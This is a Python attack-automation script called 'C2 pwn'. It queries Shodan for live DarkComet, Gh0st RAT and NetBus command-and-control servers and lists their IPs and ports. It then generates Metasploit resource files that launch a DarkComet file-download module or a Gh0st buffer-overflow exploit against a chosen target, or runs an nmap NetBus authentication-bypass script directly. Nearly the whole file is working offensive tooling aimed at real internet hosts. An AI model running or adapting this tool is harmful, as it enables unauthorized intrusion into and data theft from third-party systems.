## Author: LukeBob
## Automate Pwning C2 "Command and Controll" Servers Using Vulnerable Versions
## C2 pwn

import os
import shodan
from time import sleep
import argparse

if os.name != 'nt':
    import readline

Nmap_path = ''  ## <--- Only Needed For Windows


## Colours
class Color():
    @staticmethod
    def red(str):
        return "\033[91m" + str + "\033[0m"
    @staticmethod
    def green(str):
        return "\033[92m" + str + "\033[0m"
    @staticmethod
    def yellow(str):
        return "\033[93m" + str + "\033[0m"
    @staticmethod
    def blue(str):
        return "\033[94m" + str + "\033[0m"


banner =(Color.green("""
   ___ ____      ___
  / __\___ \    / _ \_      ___ __
 / /    __) |  / /_)| \ /\ / / '_ '
/ /___ / __/  / ___/ \ V  V /| | | |
\____/|_____| \/      \_/\_/ |_| |_|
""")+"("+Color.blue("V-1.0")+")"+Color.blue(" Author: LukeBob"))



def print_output(LPORT):
    print(
        """
----------------------------------------------------------------------------------
~                                    {0}                                     ~
----------------------------------------------------------------------------------
~  Now You Can Launch The Exploit With, msfconsole -r DarkComet_Metasploit.rc   ~
~        Remember, if you are behind nat, port forward port ({1})               ~
----------------------------------------------------------------------------------
        """.format(Color.green("RESULT"),LPORT))


# writes rc files
def build_rc(payload,rport,lport,lhost,rhost):
    rc_data = (
        """
use %s
set RPORT %s
set LPORT %s
set LHOST %s
set RHOST %s
exploit
        """%(payload,rport,lport,lhost,rhost))

    if payload == 'auxiliary/gather/darkcomet_filedownloader':
        with open("DarkComet_Metasploit.rc", "w+") as file:
            file.write(rc_data)

    elif payload == 'exploit/windows/misc/gh0st':
        with open("GhostRat_Metasploit.rc", "w+") as file:
            file.write(rc_data)


## keywords you can use on shodan "free version" to pickup C2 Servers
## On paid version you get much more and you can use filtering example (category: "malware" product: "DarkComet")
malware_terms = {
    "DarkComet"   : "BF7CAB464EFB",
    "Gh0stRat"    : "gh0st",
    "NetBus"      : "NetBus 1.60"
}

## Creates New Shodan Api Object
def get_api(api_key):
    try:
        print('\n---------------------------------\n'+Color.green('Connecting To Shodan API...')+'\n---------------------------------')
        api = shodan.Shodan(api_key)
        sleep(1)
        api.info()
        print(Color.green('Created New Api Instance!')+'\n---------------------------------\n\n\n')
        return(api)
    except shodan.exception.APIError as e:
        print(Color.red('Error:')+' %s\n---------------------------------\n\n' % e)
        exit(0)

## Gets Back Results in Dictionary Format
def search(api, term, name):
    try:
        results = api.search(term)
        return results
    except shodan.APIError as e:
        print(Color.red('Error:')+' %s' % e)
        exit(0)

## Parses Choices From User And Sends Them To Rc Class.
def pwn_one(results, name):
    print("""
---------------------------------
~           {0}            ~
---------------------------------
({2}) {4} {1} {5}
({3}) {6}
---------------------------------
    """.format(Color.blue("Options"), Color.blue(name),Color.blue("1"), Color.blue("2"),Color.yellow("List available"),Color.yellow("targets"),Color.red("Quit")))
    sing_choice = input(Color.blue('Option (1,2): '))
    if sing_choice == '1':
        print('\n\n----------------------------\n %s C2 Server List\n----------------------------\n\n'%(name))
        for i in results['matches']:
            print("[IP]: {0}\t[PORT]: {1}".format(i['ip_str'], i['port']))
        print("\n")

        ## user input for target ip and port.
        IP    = input(Color.red("Target Ip: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(IP)))
        PORT  = input(Color.red("Target Port: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(PORT)))
        LIP   = input(Color.red("Listner Ip: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(LIP)))
        LPORT = input(Color.red("Listner Port: "))
        print(Color.green("\n===> ")+"[%s]\n"%(Color.blue(LPORT)))

        ## DarkComet rc
        if name == "DarkComet":
            build_rc("auxiliary/gather/darkcomet_filedownloader",PORT,LPORT,LIP,IP)
            if os.name != 'nt':
                os.system("service postgresql restart")
            print_output(LPORT)

            sleep(3)

        ## Gh0st rc
        if name == 'gh0st':
            build_rc("exploit/windows/misc/gh0st",PORT,LPORT,LIP,IP)
            if os.name != 'nt':
                os.system("service postgresql restart")
            print_output(LPORT)
            sleep(3)

        ## Only nmap module available atm :(
        if name == "NetBus":
            print("\n\t[#]Trying Auth Bypass ... ")

            if os.name != 'nt':
                NB_comm = "nmap -p %s --script netbus-auth-bypass %s"%(PORT,IP)
            elif os.name == 'nt':
                if Nmap_path != '':
                    try:
                        NB_comm = "%s -p %s --script netbus-auth-bypass %s"%(Nmap_path,PORT.IP)
                    except:
                        raise
                elif Nmap_path == '':
                    print("\n\n\t[#] Requires Path To Nmap Binary To Continue.")
                    sleep(2)
                    quit(0)

            os.system(NB_comm)

    ## Quit
    elif sing_choice == '2':
        print(Color.green("\nShutting Down..\n"))
        quit(0)


def main(key):
    quit = False

    ## Creates API Instance
    api = get_api(key)

    ## Main Loop
    while not quit:
        print("""
-----------------------------------------------------------------------------------------------------------------------------------------------------
~                                                               {0}                                                                       ~
-----------------------------------------------------------------------------------------------------------------------------------------------------
({1}) {5}   <-- DarkComet Server Remote File Download Exploit <---> https://www.rapid7.com/db/modules/auxiliary/gather/darkcomet_filedownloader
({2}) {6}    <-- Gh0st Client buffer Overflow                  <---> https://www.rapid7.com/db/modules/exploit/windows/misc/gh0st
({3}) {7}      <-- Netbus Auth Bypass                            <---> https://nmap.org/nsedoc/scripts/netbus-auth-bypass.html
({4}) {8}
-----------------------------------------------------------------------------------------------------------------------------------------------------
        """.format(Color.blue("C2 Server List"),Color.blue("1"),Color.blue("2"),Color.blue("3"),Color.blue("4"), Color.yellow("DarkComet"),Color.yellow("GhostRat"),Color.yellow("NetBus"), Color.red("Quit")))
        number = input(Color.blue("\nC2 Server Kind To Exploit (1,2,3,4): "))
        print("\n\n")

        ## Search Shodan For DarkComet C2 Servers
        if number == '1':
            name="DarkComet"
            new_dict = search(api, term=malware_terms["DarkComet"], name=name)

        ## Search Shodan For GhostRat C2 Servers
        if number == '2':
            name="gh0st"
            new_dict = search(api, term=malware_terms["Gh0stRat"], name=name)

        ## Search Shodan For NetBus Trojan C2 Servers
        if number == '3':
            name="NetBus"
            new_dict = search(api, term=malware_terms["NetBus"], name=name)

        ## Quit
        if number == '4':
            print(Color.green("\nShutting Down..."))
            quit = True
        if not quit:
            pwn_one(new_dict, name)

if __name__ == '__main__':
        print(banner)
        sleep(1)
        ## ArgParse Stuff
        parser = argparse.ArgumentParser(description='C2 Pwn')
        parser.add_argument('--key', help='Shodan Api Key')
        args = parser.parse_args()
        try:
            if args.key:
                key = args.key
                main(key)
            else:
                parser.print_help()
                quit(0)
        except KeyboardInterrupt:
            print(Color.green("\n\nShutting down...\n"))
            exit(0)

